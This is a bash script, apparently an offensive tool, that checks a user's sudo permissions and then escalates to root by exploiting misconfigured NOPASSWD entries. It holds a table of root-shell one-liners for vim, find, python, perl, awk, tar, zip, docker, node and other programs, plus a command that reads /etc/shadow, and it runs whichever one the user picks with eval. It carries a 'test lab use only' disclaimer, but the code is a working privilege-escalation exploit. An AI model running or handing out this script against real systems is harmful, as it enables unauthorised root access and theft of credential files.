#!/bin/bash
# PrivEsc - Sudo NOPASSWD Misconfiguration Scanner & Exploiter
# For educational/test lab use only.
# Author: SentinelByte
# Version: 1.06

echo "=== Sudo NOPASSWD Privilege Escalation Check ==="

## Check basic sudo -l
echo -e "\n[*] Checking your sudo permissions with: sudo -l"
sudo -l

## Step 2a: Check for full unrestricted sudo
if sudo -l 2>/dev/null | grep -qE '\(ALL(\s*:\s*ALL)?\)\s+ALL'; then
    echo -e "\n[!] Unrestricted sudo access detected: (ALL : ALL) ALL"
    echo "    You can run any command as root. Try: sudo bash"
    exit 0
fi

## Parse sudo -l output for allowed command paths
echo -e "\n[*] Parsing allowed commands..."
mapfile -t SUDO_COMMANDS < <(sudo -l 2>/dev/null | grep -Eo '/[a-zA-Z0-9./_-]+' | sort -u)

if [ "${#SUDO_COMMANDS[@]}" -eq 0 ]; then
    echo "[-] No specific sudo NOPASSWD commands detected or sudo -l failed."
    exit 1
fi

## Define known GTFOBins-style exploitable commands
declare -A EXPLOITABLE
EXPLOITABLE=(
  [vim]="sudo vim -c ':!bash'"
  [less]="sudo less /etc/shadow"
  [find]="sudo find . -exec /bin/sh \; -quit"
  [python]="sudo python -c 'import os; os.system(\"/bin/sh\")'"
  [python3]="sudo python3 -c 'import os; os.system(\"/bin/sh\")'"
  [perl]="sudo perl -e 'exec \"/bin/sh\";'"
  [bash]="sudo bash"
  [awk]="sudo awk 'BEGIN {system(\"/bin/sh\")}'"
  [man]="sudo man man | !sh"
  [tar]="sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
  [zip]="sudo zip test.zip /etc/hosts -T -TT '/bin/sh'"
  [nmap]="sudo nmap --interactive"
  [ftp]="sudo ftp"  # Then run !sh inside ftp
  [scp]="sudo scp -S /bin/sh x y:"
  [env]="sudo env /bin/sh"
  [docker]="sudo docker run -it --rm --privileged --entrypoint /bin/sh alpine"
  [node]="sudo node -e 'require(\"child_process\").exec(\"/bin/sh\")'"
)

## Find exploitable commands
echo -e "\n[*] Searching for potentially exploitable commands:"
FOUND=0
declare -a SELECTABLE_CMDS=()
for path in "${SUDO_COMMANDS[@]}"; do
    cmd=$(basename "$path")
    if [[ ${EXPLOITABLE[$cmd]+_} ]] && command -v "$cmd" &>/dev/null; then
        echo "  [+] $cmd → ${EXPLOITABLE[$cmd]}"
        SELECTABLE_CMDS+=("$cmd")
        ((FOUND++))
    fi
done

if [ "$FOUND" -eq 0 ]; then
    echo "[-] No known exploitable binaries found in sudo list."
    echo "    You can still check manually for risky entries (editors, shells, etc)."
    exit 0
fi

## Prompt user to choose
echo -e "\n[*] Exploitable sudo commands available:"
for i in "${!SELECTABLE_CMDS[@]}"; do
    cmd="${SELECTABLE_CMDS[$i]}"
    printf "  [%d] %s → %s\n" $((i + 1)) "$cmd" "${EXPLOITABLE[$cmd]}"
done

NUM_CMDS=${#SELECTABLE_CMDS[@]}
read -p $'\n[?] Enter the number of the command to run (1 to '"$NUM_CMDS"$', or q to quit): ' SELECTION

if [[ "$SELECTION" =~ ^[0-9]+$ ]] && (( SELECTION >= 1 && SELECTION <= NUM_CMDS )); then
    SELECTED_CMD="${SELECTABLE_CMDS[$((SELECTION - 1))]}"
    echo -e "\n[*] Trying: ${EXPLOITABLE[$SELECTED_CMD]}"
    eval "${EXPLOITABLE[$SELECTED_CMD]}"
else
    echo "[-] Invalid choice. Exiting."
    exit 1
fi
